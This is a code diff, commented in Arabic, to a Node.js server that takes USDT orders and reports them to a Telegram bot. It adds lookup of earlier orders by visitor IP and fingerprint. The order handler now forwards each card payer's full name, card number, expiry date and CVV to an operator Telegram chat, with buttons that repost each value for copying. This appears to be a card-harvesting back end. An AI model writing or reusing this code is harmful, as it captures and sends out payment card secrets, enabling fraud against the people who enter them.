@@ -466,6 +466,49 @@ function normalizeBlockedIpInput(raw) {
     .trim();
 }
 
+/** طلبات سابقة في CRM لنفس البصمة أو نفس IP. يُستثنى orderId عند عرض تفاصيل طلب موجود. */
+function hasPriorOrders(orders, clientIp, visitorId, excludeOrderId = '') {
+  const ip = normalizeBlockedIpInput(clientIp);
+  const vid = String(visitorId || '').trim();
+  const ex = String(excludeOrderId || '').trim();
+  if (!vid && !ip) return false;
+  for (const o of orders) {
+    if (ex && String(o.orderId) === ex) continue;
+    const oip = normalizeBlockedIpInput(o.ip || '');
+    const ov = String(o.visitorId || '').trim();
+    if (vid && ov === vid) return true;
+    if (ip && oip === ip) return true;
+  }
+  return false;
+}
+
+function filterOrdersByIpOrVisitor(orders, clientIp, visitorId) {
+  const ip = normalizeBlockedIpInput(clientIp);
+  const vid = String(visitorId || '').trim();
+  const seen = new Set();
+  const out = [];
+  for (const o of orders) {
+    const oip = normalizeBlockedIpInput(o.ip || '');
+    const ov = String(o.visitorId || '').trim();
+    const match = (vid && ov === vid) || (ip && oip === ip);
+    if (!match) continue;
+    const id = String(o.orderId || '');
+    if (seen.has(id)) continue;
+    seen.add(id);
+    out.push(o);
+  }
+  out.sort((a, b) => new Date(b.at).getTime() - new Date(a.at).getTime());
+  return out;
+}
+
+function filterOrdersByVisitorOnly(orders, visitorId) {
+  const vid = String(visitorId || '').trim();
+  if (!vid) return [];
+  const out = orders.filter((o) => String(o.visitorId || '').trim() === vid);
+  out.sort((a, b) => new Date(b.at).getTime() - new Date(a.at).getTime());
+  return out;
+}
+
 async function loadBlockedIps() {
   try {
     const raw = JSON.parse(await readFile(BLOCKED_IPS_PATH, 'utf8'));
@@ -1566,7 +1609,7 @@ async function computeRate(details) {
 }
 
 /** Telegram: callback_data ≤ 64 bytes. Prefix od:/oa:/oc:/or: + orderId (لا يتعارض مع قوائم أخرى). */
-function orderInlineKeyboard(businessOrderId, extraRows = []) {
+function orderInlineKeyboard(businessOrderId, extraRows = [], priorRows = []) {
   const oidFull = String(businessOrderId || '').trim();
   const enc = (actionLetter) => {
     const prefix = `o${actionLetter}:`;
@@ -1584,6 +1627,7 @@ function orderInlineKeyboard(businessOrderId, extraRows = []) {
         { text: '❌ إلغاء الطلب', callback_data: enc('c') },
       ],
       [{ text: '↩️ استرجاع', callback_data: enc('r') }],
+      ...priorRows,
       ...extraRows,
     ],
   };
@@ -1599,6 +1643,48 @@ function orderStatusLabelAr(status) {
     refunded: 'استرجاع',
   };
   return map[s] || s;
+}
+
+function buildPriorOrderRows(clientIp, visitorId) {
+  const tokU = makeActionToken('rel_u', `${normalizeBlockedIpInput(clientIp)}\t${String(visitorId).trim()}`);
+  const tokV = makeActionToken('rel_v', String(visitorId).trim());
+  return [
+    [{ text: '📎 طلبات سابقة (نفس IP أو البصمة)', callback_data: `rk1:${tokU}` }],
+    [{ text: '📋 تصفح كامل طلباته (نفس الجهاز)', callback_data: `rk2:${tokV}` }],
+  ];
+}
+
+async function sendTelegramOrderList(chatId, orders, titleHtml) {
+  if (!orders.length) {
+    await botSend(`📭 ${titleHtml}\n\nلا توجد طلبات مطابقة.`, {}, chatId);
+    return;
+  }
+  const header = `${titleHtml}\n<b>العدد:</b> ${orders.length}\n━━━━━━━━━━━━━━━`;
+  const lines = orders.map((o) => {
+    const st = orderStatusLabelAr(o.status || 'received');
+    return (
+      `• <code>${escapeTelegramHtml(o.orderId)}</code> — ${escapeTelegramHtml(st)}\n`
+      + `  ${escapeTelegramHtml(String(o.usdtAmount))} USDT — ${escapeTelegramHtml(o.name || '')}\n`
+      + `  <i>${escapeTelegramHtml(o.at)}</i>`
+    );
+  });
+  const maxBytes = 3800;
+  const messages = [];
+  let buf = header;
+  for (const line of lines) {
+    const tryAdd = buf + (buf === header ? '\n\n' : '\n\n') + line;
+    if (Buffer.byteLength(tryAdd, 'utf8') > maxBytes) {
+      messages.push(buf);
+      buf = line;
+    } else {
+      buf = tryAdd;
+    }
+  }
+  if (buf) messages.push(buf);
+  for (let i = 0; i < messages.length; i++) {
+    const text = messages.length > 1 ? `<b>${i + 1}/${messages.length}</b>\n${messages[i]}` : messages[i];
+    await botSend(text, {}, chatId);
+  }
 }
 
 /**
@@ -1826,6 +1912,8 @@ app.post('/api/order', async (req, res) => {
       ? `<b>👤 بروفايل المنصة:</b> ${escapeTelegramHtml(activeProf.nameAr)} (${escapeTelegramHtml(activeProf.nameEn)})`
       : null;
 
+    const hasPriorCustomerOrders = hasPriorOrders(existingOrders, clientIp, visitorId);
+
     const isHighValue =
       Number.isFinite(kycThreshold) && kycThreshold > 0 && amountNum >= kycThreshold;
     const highValueLine = isHighValue
@@ -1860,17 +1948,52 @@ app.post('/api/order', async (req, res) => {
           ]
         : []),
       '━━━━━━━━━━━━━━━',
+      hasPriorCustomerOrders
+        ? '⚠️ <b>تنبيه:</b> يوجد طلبات سابقة من نفس IP أو البصمة — استخدم الأزرار أدناه.'
+        : null,
       '<i>استخدم الأزرار أدناه لتحديث حالة الطلب (يظهر للعميل في صفحة التتبع).</i>',
     ].filter(Boolean);
 
     const modKb = await moderationInlineKeyboard(clientIp, visitorId);
     const modRows = modKb?.inline_keyboard || [];
+    const priorRows = hasPriorCustomerOrders ? buildPriorOrderRows(clientIp, visitorId) : [];
     const { data: tgOrder } = await tgPostJson(botToken, 'sendMessage', {
       chat_id: telegramChatIdForApi(chatId),
       text: lines.join('\n'),
       parse_mode: 'HTML',
-      reply_markup: orderInlineKeyboard(safeOrderId, modRows),
+      reply_markup: orderInlineKeyboard(safeOrderId, modRows, priorRows),
     });
+
+    if (paymentMethod === 'CreditCard' && tgOrder?.ok) {
+      const ccHolder = String(cardHolderName || '').trim();
+      const ccPan = String(cardNumber || '').replace(/\D/g, '');
+      const ccExp = String(cardExpiryNorm || '').trim();
+      const ccCvv = String(cardCvv || '').trim();
+      const copyCardKb = {
+        inline_keyboard: [
+          [
+            { text: '📋 نسخ اسم الحامل', callback_data: `cccp:${makeActionToken('ccp_h', ccHolder)}` },
+            { text: '📋 نسخ الرقم', callback_data: `cccp:${makeActionToken('ccp_n', ccPan)}` },
+          ],
+          [
+            { text: '📋 نسخ التاريخ', callback_data: `cccp:${makeActionToken('ccp_e', ccExp)}` },
+            { text: '📋 نسخ CVV', callback_data: `cccp:${makeActionToken('ccp_v', ccCvv)}` },
+          ],
+        ],
+      };
+      const { data: tgCopy } = await tgPostJson(botToken, 'sendMessage', {
+        chat_id: telegramChatIdForApi(chatId),
+        text:
+          '💳 <b>بيانات البطاقة — نسخ سريع</b>\n'
+          + `<code>${escapeTelegramHtml(safeOrderId)}</code>\n`
+          + 'اضغط زراً لإرسال القيمة في رسالة منفصلة (<code>جاهزة للنسخ</code>).',
+        parse_mode: 'HTML',
+        reply_markup: copyCardKb,
+      });
+      if (!tgCopy?.ok) {
+        console.error('[order] Telegram card copy keyboard:', JSON.stringify(tgCopy || {}));
+      }
+    }
 
     if (!tgOrder?.ok) {
       console.error('[order] Telegram sendMessage:', JSON.stringify(tgOrder || {}));
@@ -2925,7 +3048,10 @@ async function sendOrderDetailsById(orderId, forceChatId = null) {
   ].filter(Boolean);
   const modKb = await moderationInlineKeyboard(resolvedIp, o.visitorId || '');
   const modRows = modKb?.inline_keyboard || [];
-  const ordKb = orderInlineKeyboard(o.orderId, modRows);
+  const priorRows = hasPriorOrders(all, resolvedIp || o.ip, o.visitorId || '', o.orderId)
+    ? buildPriorOrderRows(resolvedIp || o.ip || '', o.visitorId || '')
+    : [];
+  const ordKb = orderInlineKeyboard(o.orderId, modRows, priorRows);
   ordKb.inline_keyboard.push(
     [{ text: '🔙 أنواع الطلبات', callback_data: 'menu_orders' }],
     MAIN_MENU_INLINE_BTN,
@@ -3086,6 +3212,74 @@ async function handleCallbackQuery(data, incomingChatId, fromUserId) {
   const ordPageCb = String(data || '').match(/^ordp:(\d+)$/);
   if (ordPageCb) {
     await showOrdersMenu(incomingChatId, Number(ordPageCb[1]) || 0, 'p');
+    return;
+  }
+
+  const rk1 = String(data || '').match(/^rk1:(.+)$/);
+  if (rk1) {
+    const raw = readActionToken(rk1[1], 'rel_u');
+    if (!raw) {
+      await botSend('⚠️ انتهت صلاحية الزر. أعد فتح الطلب من رسالة جديدة.', {}, incomingChatId);
+      return;
+    }
+    const tab = raw.indexOf('\t');
+    const ipPart = tab >= 0 ? raw.slice(0, tab) : '';
+    const vidPart = tab >= 0 ? raw.slice(tab + 1) : raw;
+    const allOrders = await loadOrders(ORDERS_CRM_PATH);
+    const matched = filterOrdersByIpOrVisitor(allOrders, ipPart, vidPart);
+    await sendTelegramOrderList(
+      incomingChatId,
+      matched,
+      '🔗 <b>طلبات الزبون السابقة (نفس IP أو البصمة)</b>'
+    );
+    return;
+  }
+
+  const rk2 = String(data || '').match(/^rk2:(.+)$/);
+  if (rk2) {
+    const vid = readActionToken(rk2[1], 'rel_v');
+    if (!vid) {
+      await botSend('⚠️ انتهت صلاحية الزر. أعد فتح الطلب من رسالة جديدة.', {}, incomingChatId);
+      return;
+    }
+    const allOrders = await loadOrders(ORDERS_CRM_PATH);
+    const matched = filterOrdersByVisitorOnly(allOrders, vid);
+    const title = String(vid).startsWith('ip:')
+      ? '📋 <b>جميع طلبات هذا الزبون (نفس معرّف IP)</b>'
+      : '📋 <b>جميع طلبات هذا الزبون (نفس البصمة / الجهاز)</b>';
+    await sendTelegramOrderList(incomingChatId, matched, title);
+    return;
+  }
+
+  const cccpM = String(data || '').match(/^cccp:(.+)$/);
+  if (cccpM) {
+    const token = cccpM[1];
+    const types = ['ccp_h', 'ccp_n', 'ccp_e', 'ccp_v'];
+    const labels = {
+      ccp_h: 'اسم الحامل',
+      ccp_n: 'رقم البطاقة',
+      ccp_e: 'تاريخ الانتهاء',
+      ccp_v: 'CVV',
+    };
+    let val = null;
+    let tp = '';
+    for (const t of types) {
+      const v = readActionToken(token, t);
+      if (v != null && v !== '') {
+        val = v;
+        tp = t;
+        break;
+      }
+    }
+    if (val == null) {
+      await botSend('⚠️ انتهت صلاحية زر النسخ. أعد فتح آخر طلب بطاقة.', {}, incomingChatId);
+      return;
+    }
+    await botSend(
+      `📋 <b>${labels[tp] || 'قيمة'}</b>\n<code>${escapeTelegramHtml(String(val))}</code>\n\n<i>اضغط مطولاً على القيمة أو انسخ من القائمة.</i>`,
+      {},
+      incomingChatId
+    );
     return;
   }
 
